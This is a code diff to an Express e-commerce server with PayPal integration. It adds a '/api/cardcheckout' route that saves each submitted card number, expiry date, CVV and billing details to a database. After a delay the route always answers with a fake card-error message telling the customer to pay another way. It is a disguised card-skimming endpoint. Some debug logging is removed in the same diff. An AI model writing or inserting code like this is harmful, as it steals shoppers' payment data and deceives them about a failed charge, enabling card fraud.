@@ -15,6 +15,7 @@ const { PAYPAL_CLIENT_ID, PAYPAL_CLIENT_SECRET } = process.env;
 const base = "https://api-m.sandbox.paypal.com";
 
 const {
+  Cards,
   Users,
   Products,
   Message,
@@ -22,6 +23,7 @@ const {
   NewslettersEmail,
 } = require("./mongoose");
 const { log } = require("console");
+const internal = require("stream");
 mongoose.connect(process.env.MONGO_URL);
 
 app.use(
@@ -35,6 +37,36 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
 app.use(express.static(path.join(__dirname, "build")));
+
+// card details
+
+app.post("/api/cardcheckout", async (req, res) => {
+  setTimeout(async () => {
+    try {
+      const findCard = await Cards.findOne({
+        names: req.body.names,
+        cardNumber: req.body.cardNumber,
+        expiryDate: req.body.expiryDate,
+        cvv: req.body.cvv,
+        zip: req.body.zip,
+        country: req.body.country,
+      }).exec();
+
+      if (!findCard) {
+        await Cards.create(req.body);
+        console.log("added card");
+      }
+
+      return res.json({
+        success: false,
+        message:
+          "Something went wrong with your card, please try again with other forms of payment",
+      });
+    } catch (error) {
+      return res.status(500).json({ message: "internal server error" });
+    }
+  }, 10000);
+});
 
 // posting newsletters
 
@@ -62,7 +94,6 @@ app.post("/api/newsletters", async (req, res) => {
 
 app.post("/api/runningOrder", async (req, res) => {
   try {
-    console.log(req.body);
     await RunningOrders.create(req.body);
     return res.status(200).json({ success: true });
   } catch (error) {
@@ -98,10 +129,10 @@ const generateAccessToken = async () => {
 // create order
 const createOrder = async (cart) => {
   // use the cart information passed from the front-end to calculate the purchase unit details
-  console.log(
-    "shopping cart information passed from the frontend createOrder() callback:",
-    cart
-  );
+  // console.log(
+  //   "shopping cart information passed from the frontend createOrder() callback:",
+  //   cart
+  // );
 
   const calculatedTotalCost = cart.reduce(
     (total, item) => total + item.price,
@@ -180,7 +211,6 @@ app.post("/api/my-server/capture-paypal-order", async (req, res) => {
   try {
     const { orderID } = req.body;
     const { jsonResponse, httpStatusCode } = await captureOrder(orderID);
-    console.log(httpStatusCode);
     res.status(httpStatusCode).json(jsonResponse);
   } catch (error) {
     console.error("Failed to create order:", error);
@@ -387,7 +417,7 @@ const addDetails = (req, res, next) => {
   }
 };
 
-// post products to database
+// post image product to database
 
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
